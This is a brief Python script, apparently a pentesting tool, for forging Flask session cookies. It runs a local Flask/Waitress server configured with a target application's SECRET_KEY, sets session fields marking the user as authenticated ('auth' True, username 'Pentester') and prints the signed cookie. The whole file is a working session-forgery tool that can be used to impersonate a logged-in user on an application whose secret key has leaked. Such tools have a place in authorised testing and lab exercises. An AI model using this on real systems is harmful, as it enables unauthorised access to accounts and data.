#!/usr/bin/env python3

from flask import Flask, session, request
from waitress import serve
import requests, threading, time

#Flask Initialisation
app = Flask(__name__)
app.config["SECRET_KEY"] = "PUT THE KEY HERE"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = "Pentester"
    return "Check your cookies", 200

#Flask setup/start
thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

#Request
time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
